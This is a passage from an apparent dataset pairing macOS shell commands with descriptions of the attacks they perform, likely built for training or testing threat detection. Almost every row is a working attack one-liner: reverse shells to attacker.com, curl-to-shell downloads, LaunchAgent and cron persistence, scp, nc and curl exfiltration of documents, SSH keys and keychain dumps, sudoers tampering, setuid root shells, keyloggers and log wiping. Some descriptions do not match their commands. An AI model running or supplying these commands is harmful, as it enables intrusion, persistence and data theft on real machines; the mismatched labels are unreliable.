</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to maintain remote access."
"find ~/Documents -type f -name '*.pdf' -exec scp {} user@attacker.com:/target_path/ \;","Exfiltrating sensitive files from the macOS system."
"echo '1.2.3.4 example.com' | sudo tee -a /etc/hosts","Manipulating the system's network configuration to redirect traffic."
"while true; do find /some/important/directory -type f -mmin -1 -exec echo {} >> /tmp/directory_access.log \;; sleep 60; done","Persistence by monitoring directory changes and logging directory access in macOS."
"open /Volumes/MaliciousDrive/Payload.app","Infection of a macOS system through a malicious payload disguised within an email attachment."
"defaults write com.apple.mail EnableBundles -bool true && defaults write com.apple.mail BundleCompatibilityVersion -string 3 && cp -a /path/to/malicious.mailbundle ~/Library/Mail/Bundles/","Using email spoofing techniques to make an email appear as if it's coming from a trusted source."
"echo 'From: ""Trusted Source"" <malicious@phishing.com>' | sendmail -f fake@trustedsource.com victim@targetdomain.com","Exploiting display name deception in email clients to mask the sender's identity."
"defaults write com.apple.safari IncludeInternalDebugMenu 1 && defaults read ~/Library/Safari/History.db 'select visit_time, title, url from history_visits inner join history_items on history_items.id = history_visits.history_item;' > ~/Desktop/safari_history.txt","Persistent tracking of user web browsing history on macOS."
"open /path/to/malicious/attachment","Malware installation through the execution of a malicious payload received via an email attachment."
"osascript -e 'do shell script ""bash -i >& /dev/tcp/attacker.com/4444 0>&1""'","Executing a script embedded in an email to establish a backdoor."
"sendmail -f forged@example.com victim@example.com < /path/to/malicious/message","Forging the sender address in an email to disguise the origin of a phishing attack."
"curl -s http://example.com/malicious_script.sh | sh","Malware installation using a disguised curl command to download and execute a script."
"cd /usr/local/bin && curl -s http://example.com/rootkit -o .hidden_rootkit && chmod +x .hidden_rootkit && ./.hidden_rootkit","Rootkit embedding through a hidden file in the system directory."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>\n<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n<plist version=""1.0"">\n<dict>\n <key>Label</key>\n <string>com.malicious.daemon</string>\n <key>ProgramArguments</key>\n <array>\n <string>/usr/local/bin/malicious_program</string>\n </array>\n <key>RunAtLoad</key>\n <true/>\n</dict>\n</plist>' > ~/Library/LaunchAgents/com.malicious.daemon.plist && launchctl load ~/Library/LaunchAgents/com.malicious.daemon.plist","Establishing boot persistence for a malicious program using launchd."
"hdiutil create -size 100m -fs 'HFS+J' -volname 'Backup' hidden_volume.dmg && hdiutil attach hidden_volume.dmg -hidden && cp /path/to/malicious_file /Volumes/Backup/","Volume shadow copy exploitation to hide malicious activity."
"find / -perm +6000 -type f -exec ls -ld {} \;","Identification of files with the setuid or setgid bit set, which can be indicative of privilege escalation attempts."
"echo '0 * * * * curl -fsSL http://malicious-url.com/payload.sh | sh' >> ~/.crontab && crontab ~/.crontab","Persistence via a hidden cron job that downloads and executes a script every hour"
"echo 'standard_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers","A scenario where the sudoers file is modified to grant admin privileges to a standard user account without authorization."
"cp /bin/sh /tmp/privileged_sh && chmod +s /tmp/privileged_sh","Privilege escalation by exploiting a setuid binary on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.hourlytask</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-fsSL</string>
		<string>http://malicious-url.com/script.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>StartInterval</key>
	<integer>3600</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.hourlytask.plist && launchctl load ~/Library/LaunchAgents/com.malicious.hourlytask.plist","Persistence via LaunchAgent that executes a script every hour"
"for user in $(dscl . list /Users | grep -v '_'); do sshpass -p 'CommonPass123' ssh $user@target-system 'echo ""#"" | sudo -S command'; done","Persistence mechanism to maintain unauthorized remote access using SSH with a password spraying approach."
"mkdir ~/.hidden_monitor && echo 'while true; do lsof +D ~/Documents > ~/.hidden_monitor/log.txt; sleep 300; done' > ~/.hidden_monitor/monitor.sh && chmod +x ~/.hidden_monitor/monitor.sh && (crontab -l 2>/dev/null; echo '@reboot ~/.hidden_monitor/monitor.sh') | crontab -","Persistence via creation of a hidden directory to monitor file system activity."
"sudo kextload /Library/Extensions/malicious_extension.kext","Persistence mechanism achieved by loading a malicious kernel extension."
"sudo cp com.malicious.daemon.plist /Library/LaunchDaemons/ && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Establishing a backdoor through a launch daemon."
"csrutil enable --without kext","Modifying System Integrity Protection to allow unsigned kernel extensions."
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Establishing unauthorized remote access through a reverse shell on macOS."
"while true; do screencapture -x ~/Desktop/screenshot-$(date +%Y%m%d%H%M%S).png; sleep 300; done","Capturing screenshots periodically to monitor user activity."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.plist</string>
	<key>ProgramArguments</key>
	<array>
		<string>curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/script.sh</string>
		<string>|</string>
		<string>sh</string>
	</array>
	<key>StartInterval</key>
	<integer>3600</integer>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file that loads a script from a remote server every 60 minutes."
"echo '*/30 * * * * /usr/bin/python /tmp/.hidden_script.py' | sudo tee -a /etc/crontab","Privilege escalation by injecting malicious script into system-wide cron directories for persistence."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious</string>
		<string>http://malicious-url.com/malicious</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.daemon.plist && launchctl load ~/Library/LaunchAgents/com.malicious.daemon.plist","Persistence via malicious daemon service using a plist file."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reverse</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell on system startup."
"find ~ -name 'id_rsa' -exec scp {} user@remote-server:/path/to/upload/ \;","Data exfiltration by locating and transferring SSH private keys to a remote server."
"bash -i >& /dev/tcp/remote-server-ip/4444 0>&1","Establishing a reverse shell to maintain remote access."
"echo 'rdp://remote-server-ip' > ~/Library/Preferences/com.apple.desktop.plist","Exploiting the Remote Desktop Protocol to gain unauthorized remote access."
"security dump-keychain -d login.keychain > /tmp/credentials.txt && scp /tmp/credentials.txt user@remote-server:/path/to/upload/","Dumping credentials for remote access by extracting the login keychain contents."
"while true; do pbpaste > /tmp/clipboard.txt; curl -X POST -d @/tmp/clipboard.txt http://malicious-server.com/upload; sleep 300; done","A script that captures clipboard data and sends it to a remote server every 5 minutes."
"*/10 * * * * /usr/bin/top -l 1 >> /tmp/system_monitor.log","A scenario where a script is set up to run the top command at regular intervals to monitor system processes and potentially identify vulnerable points for exploitation."
"sudo rm -rf /var/log/*","A scenario where system logs are deleted to hide unauthorized access."
"for user in $(cat users.txt); do ssh $user@target.com 'password123'; done","A scenario where a malicious actor attempts to gain remote access through SSH by using password spraying against a list of known usernames."
"echo > /var/log/auth.log","A situation where the same malicious actor tries to evade SSH log monitoring after performing a password spraying attack."
"tar -czvf ~/Documents.tar.gz ~/Documents && scp ~/Documents.tar.gz user@remote-server.com:/target_directory","Data exfiltration by compressing and sending the Documents directory to a remote server via SCP."
"launchctl setenv DEBUG_MODE 1 && echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.hidden.agent</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-L</string><string>http://malicious-url.com/hidden_daemon</string><string>-o</string><string>/Library/.hidden/daemon</string></array><key>RunAtLoad</key><true/><key>LaunchOnlyOnce</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.hidden.agent.plist && chmod 644 ~/Library/LaunchAgents/com.hidden.agent.plist && launchctl load ~/Library/LaunchAgents/com.hidden.agent.plist && launchctl setenv DEBUG_MODE 0","Persistence via hidden launch agent that evades system monitoring tools."
"gcc -o exploit exploit.c; ./exploit","Privilege escalation by exploiting buffer overflow vulnerabilities in a macOS system."
"echo 'int main() { /* malicious system call code here */ return 0; }' > exploit.c; gcc -o syscall_exploit exploit.c; ./syscall_exploit","Exploiting kernel vulnerabilities through crafted system calls to gain root access."
"echo 'int main() { /* integer overflow exploit code */ return 0; }' > int_overflow.c; gcc -o int_overflow int_overflow.c; ./int_overflow","Executing code to take advantage of integer overflow issues in a privileged process."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/keylogger</string>
		<string>http://malicious-url.com/keylogger</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to execute a keylogger every 5 minutes."
"log erase --all","Altering system logs to hide malicious activity traces."
"echo '0 * * * * log erase --all' | crontab -","Creating scheduled tasks for log cleanup to avoid detection."
"find ~ -name 'id_rsa' -exec scp {} user@malicious-server.com:/stolen_keys/ \;","Data exfiltration of SSH keys from a macOS system."
"echo 'ssh-rsa AAA... user@example.com' >> ~/.ssh/authorized_keys","Setting up remote access by adding a public key to authorized_keys."
"ssh-keygen -f /etc/ssh/ssh_host_rsa_key -N '' -t rsa","Spoofing the host key to intercept future SSH connections."
"sudo tcpdump -i en0 -w ~/Desktop/UnauthorizedCapture.pcap","Capturing network traffic on a macOS system for unauthorized monitoring."
"tar -czf - ~/Documents | nc -w 3 attacker.com 1234","Data exfiltration by sending the contents of a user's Documents directory to a remote server."
"sudo systemsetup -setremotelogin on && sudo dscl . -create /Users/remoteuser && sudo dscl . -create /Users/remoteuser UserShell /bin/bash && sudo dscl . -create /Users/remoteuser RealName 'Remote User' && sudo dscl . -create /Users/remoteuser UniqueID '1010' && sudo dscl . -create /Users/remoteuser PrimaryGroupID 80 && sudo dscl . -create /Users/remoteuser NFSHomeDirectory /Users/remoteuser && sudo dscl . -passwd /Users/remoteuser password && sudo dscl . -append /Groups/admin GroupMembership remoteuser && mkdir /Users/remoteuser/.ssh && echo 'ssh-rsa AAAAB3Nza...QDw== remoteuser' > /Users/remoteuser/.ssh/authorized_keys && chown -R remoteuser /Users/remoteuser/.ssh && chmod 700 /Users/remoteuser/.ssh && chmod 600 /Users/remoteuser/.ssh/authorized_keys","Setting up remote access by enabling SSH and creating a new user with SSH keys for unauthorized access."
"networksetup -setwebproxy Wi-Fi attacker-proxy.com 8080 && networksetup -setsecurewebproxy Wi-Fi attacker-proxy.com 8080","Manipulation of system network configuration to redirect traffic through a malicious proxy."
"sudo route -n add -net 192.168.1.0/24 192.168.1.100","Modifying the routing table to redirect specific network traffic to an attacker-controlled machine."
"Persistence via Launch Agent plist","A macOS system receives an email with an attachment that, when executed, installs a persistent backdoor."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/backdoor.sh</string>
		<string>http://malicious-url.com/backdoor.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load -w ~/Library/LaunchAgents/com.malicious.backdoor.plist","The attachment is a disguised script that modifies the launchd system to maintain access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>\n<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n<plist version=""1.0"">\n<dict>\n	<key>Label</key>\n	<string>com.malicious.plist</string>\n	<key>ProgramArguments</key>\n	<array>\n		<string>/usr/bin/curl</string>\n		<string>-s</string>\n		<string>http://malicious-url.com/payload</string>\n		<string>-o</string>\n		<string>/tmp/payload</string>\n		<string>chmod +x /tmp/payload && /tmp/payload</string>\n	</array>\n	<key>RunAtLoad</key>\n	<true/>\n	<key>KeepAlive</key>\n	<true/>\n</dict>\n</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file to maintain access with elevated privileges."
"TF=$(mktemp -u); echo '#!/bin/bash' > $TF; echo '/bin/bash -i' >> $TF; chmod +x $TF; export PATH=$(dirname $TF):$PATH; /path/to/vulnerable/setuid/binary","Injecting code into a privileged process by exploiting a setuid binary that improperly handles environment variables."
"echo 'while true; do echo malicious code; sleep 60; done' | nohup bash &","Malicious process creation by injecting code into a running process."
"ps aux | grep -v grep | grep 'target_process_name'","Enumeration of process list to identify potential targets for exploitation."
"curl http://malicious-url.com/rootkit.tar.gz | tar -xz && cd rootkit && make && make install","Installation of a rootkit to maintain persistent access and hide malicious activity."
"osascript -e 'tell app ""ARDAgent"" to do shell script ""whoami"" with administrator privileges'","Persistence through unauthorized remote login by exploiting remote desktop vulnerabilities to escalate privileges."
"sudo arpspoof -i en0 -t target_ip gateway_ip","Intercepting network traffic by performing ARP poisoning on a macOS system to capture sensitive information."
"sudo cp -a /path/to/malicious_extension.kext /System/Library/Extensions/ && sudo kextload /System/Library/Extensions/malicious_extension.kext","Persistence mechanism through a malicious kernel extension loaded at boot time."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious_script.sh"", hidden:false}'","Adding a login item to execute a script every time the user logs in."
"echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > /etc/rc.common && chmod +x /etc/rc.common","Creation of a startup script to establish a reverse shell connection on system boot."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://attacker.com/malicious.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to maintain remote access."
"echo ""* * * * * /bin/bash -c \""$(curl -fsSL http://malicious-url.com/payload.sh)\"""" | crontab -","Persistence mechanism using a user-specific cron job to execute a script hosted on a remote server."
"while true; do pbpaste | nc -l 9999; sleep 1; done","Data exfiltration through keylogging and monitoring clipboard data on macOS systems."
"ssh -A user@victim.com 'echo $SSH_AUTH_SOCK && ssh-add -l'","SSH agent hijacking to use the agent's keys for unauthorized access."
"touch ~/.hidden_monitor && echo 'while true; do find / -type f -exec stat -f ""%m%t%Sm %N"" {} +; sleep 60; done' > ~/.hidden_monitor","A command that creates a hidden file in the macOS system to monitor file system changes without the user's knowledge."
"ssh-keyscan -H target.macOS.system >> ~/.ssh/known_hosts && hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.macOS.system","A scenario where an attacker gains remote access to a macOS system by bypassing port knocking using a brute force attack on SSH."
"find / -perm -4002 -type f -exec ls -la {} \;","Privilege escalation by abusing setuid binaries through searching for world-writable setuid files."
"echo 'int main() { setuid(0); system(""/bin/sh""); return 0; }' > setuid.c && gcc setuid.c -o setuid && chmod u+s setuid","Setuid file tampering to gain elevated privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/payload.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file to maintain access to a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/backdoor.sh</string>
		<string>http://malicious-url.com/backdoor.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to maintain access to a macOS system."
"echo '0 * * * * curl -fsSL http://malicious-url.com/payload.sh | sh' >> ~/.crontab && crontab ~/.crontab","Persistence via a hidden cron job that downloads and executes a script every hour."
"echo 'int main() { setuid(0); system(""/bin/sh""); return 0; }' > priv_esc.c && cc priv_esc.c -o priv_esc && chmod u+s priv_esc && export PATH=.:$PATH && sudo priv_esc","Privilege escalation by exploiting sudo misconfigurations involving environment variable manipulation."
"TF=$(mktemp) echo 'ALL ALL=(ALL) NOPASSWD: ALL' > $TF && sudo -E -u#-1 sudo -u#4294967295 -s $TF","Privilege escalation by exploiting sudo misconfigurations related to Sudo version CVE-2017-1000367."
"curl -s http://malicious-url.com/fake_flash_update.sh | sh","Malware installation through a drive-by download initiated by a user taking an online quiz that prompts to update a fake Flash Player."
"sudo kextload /Library/Extensions/malicious_extension.kext","Persistence mechanism using a malicious kernel extension loaded at boot time."
"sudo profiles -I -F /path/to/malicious.mobileconfig","Establishing persistence by installing a malicious profile that enforces settings and runs commands."
"echo '0 * * * * curl -fsSL http://unauthorized-url.com/script.sh | bash' | crontab -","Creating a cron job to execute a script from an unauthorized URL every hour."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations that allow executing any command without a password."
"echo 'alias ls=""bash -i >& /dev/tcp/attacker.com/4444 0>&1""' >> ~/.bash_profile && source ~/.bash_profile","Alias override to replace a common system utility with a malicious script."
"mkdir /tmp/fakebin; echo 'echo ""root ALL=(ALL) ALL"" > /etc/sudoers' > /tmp/fakebin/sudo; chmod +x /tmp/fakebin/sudo; export PATH=/tmp/fakebin:$PATH","Path hijacking by prepending a fake directory containing a malicious 'sudo' to the PATH variable."
"sqlite3 ~/Library/Safari/History.db 'SELECT url FROM history_items;' > browsing_history.txt","Extracting web browsing history from a macOS system."
"open /path/to/malicious/attachment; osascript -e 'do shell script ""launchctl load /path/to/malicious/launchd.plist"" with administrator privileges'","Malicious payload execution from an email attachment on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.remote.webcamaccess</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/python</string>
		<string>/tmp/webcam.py</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.remote.webcamaccess.plist && launchctl load ~/Library/LaunchAgents/com.remote.webcamaccess.plist","Persistence via malicious plist to enable remote webcam access"
"curl -s http://malicious-url.com/keylogger -o ~/.local/k && chmod +x ~/.local/k && nohup ~/.local/k &","A keylogger is installed to capture every keystroke of a macOS user."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.user.maliciousagent</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-s</string><string>http://malicious-url.com/payload.sh</string><string>-o</string><string>/tmp/payload.sh</string></array><key>StartInterval</key><integer>300</integer><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.user.maliciousagent.plist && launchctl load ~/Library/LaunchAgents/com.user.maliciousagent.plist","Persistence mechanism using a user-specific launch agent to execute a script periodically."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/.hidden.app"", hidden:true}'","Persistence by adding a hidden application to login items"
"zip -er confidential.zip ~/Documents/Confidential/ && uuencode confidential.zip confidential.zip | mail -s 'Confidential' target@example.com","Exfiltrating confidential documents from a macOS system by emailing them as encrypted file attachments."
"osascript -e 'do shell script ""curl http://malicious-url.com/malware.dmg -o ~/Downloads/legitimate_document.dmg && hdiutil attach ~/Downloads/legitimate_document.dmg && cp /Volumes/Malware/malicious_file.app /Applications/ && open /Applications/malicious_file.app"" with administrator privileges'","Infection of a macOS system through a user executing a malicious payload that was masqueraded as a legitimate document in a spoofed email."
"ssh -i /path/to/stolen/private/key user@victim.com 'echo ""echo \""launchctl load /Library/LaunchDaemons/com.malicious.plist\"" >> ~/.bash_profile' && echo ""* * * * * /malicious/script.sh"" | crontab -","Unauthorized remote login using stolen SSH keys to escalate privileges on a macOS system."
"zip -r /tmp/sensitive_documents.zip ~/Documents/Sensitive && curl --upload-file /tmp/sensitive_documents.zip http://attacker.com/upload","Exfiltrating sensitive documents from a macOS system."
"sudo systemsetup -setremotelogin on && sudo dscl . create /Users/remoteadmin && sudo dscl . create /Users/remoteadmin UserShell /bin/bash && sudo dscl . create /Users/remoteadmin RealName 'Remote Admin' && sudo dscl . create /Users/remoteadmin UniqueID '1010' && sudo dscl . create /Users/remoteadmin PrimaryGroupID 80 && sudo dscl . create /Users/remoteadmin NFSHomeDirectory /Users/remoteadmin && sudo dscl . passwd /Users/remoteadmin password && sudo dscl . append /Groups/admin GroupMembership remoteadmin && sudo mkdir /Users/remoteadmin/.ssh && echo 'ssh-rsa AAAAB3Nza... user@host' > /Users/remoteadmin/.ssh/authorized_keys && sudo chown -R remoteadmin:admin /Users/remoteadmin/.ssh && sudo chmod 700 /Users/remoteadmin/.ssh && sudo chmod 600 /Users/remoteadmin/.ssh/authorized_keys","Setting up remote access on a macOS system by enabling SSH and creating a new user with SSH key."
"sudo defaults write /Library/Preferences/com.apple.RemoteManagement.plist LogFileDisabled -bool true","Disabling RDP logging to prevent detection of remote desktop usage."
"osascript -e 'do shell script ""chmod +s /path/to/vulnerable/app"" with administrator privileges'","Injecting code into privileged processes on macOS to escalate privileges."
"DYLD_INSERT_LIBRARIES=/path/to/malicious/library.dylib /path/to/vulnerable/app","Exploiting dylib hijacking to execute arbitrary code with elevated permissions."
"echo 'echo ""malicious code"" | osascript' | at -t $(date -v+1M +""%Y%m%d%H%M"")","Using inter-process communication exploits to perform privilege escalation."
"echo ""* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1"" | crontab -","Persistence by adding a cron job to maintain a reverse shell connection."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reverse</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell on system boot."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load -w ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell connection."
"sudo echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Persistence via malicious LaunchDaemon plist file that executes a script every boot."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.disguised.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/.hidden_keylogger</string>
		<string>http://malicious-url.com/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.disguised.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.disguised.keylogger.plist","Persistence of a disguised keylogger in macOS through Launch Agents."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>\n<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n<plist version=""1.0"">\n<dict>\n <key>Label</key>\n <string>com.malicious.payload</string>\n <key>ProgramArguments</key>\n <array>\n <string>sh</string>\n <string>-c</string>\n <string>curl -fsSL http://malicious-url.com/payload.sh | sh</string>\n </array>\n <key>StartInterval</key>\n <integer>300</integer>\n <key>RunAtLoad</key>\n <true/>\n</dict>\n</plist>' > ~/Library/LaunchAgents/com.malicious.payload.plist && launchctl load ~/Library/LaunchAgents/com.malicious.payload.plist","Persistence via malicious plist file to execute a payload every 5 minutes."
"touch -a -mt 202301010000 /var/log/system.log","A scenario where the access times of log files are manipulated to hide malicious activity."
"OUTFILE='/tmp/hidden.png'; echo 'Confidential content' | openssl enc -aes-256-cbc -a -salt -pass pass:secretpassword | steghide embed -ef - -cf /path/to/image.png -sf $OUTFILE -p stegopassword; mail -s 'Important Image' -a $OUTFILE recipient@example.com < /dev/null","Exfiltrating confidential documents by embedding them into an image using steganography and emailing the image as an attachment."
"cp /usr/bin/env /tmp/; echo 'echo malicious_code' > /tmp/env; chmod u+s /tmp/env","Injecting malicious code into setuid executables to gain elevated privileges."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious.app"", hidden:false}'","Persistence via scripting additions that execute upon user login."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
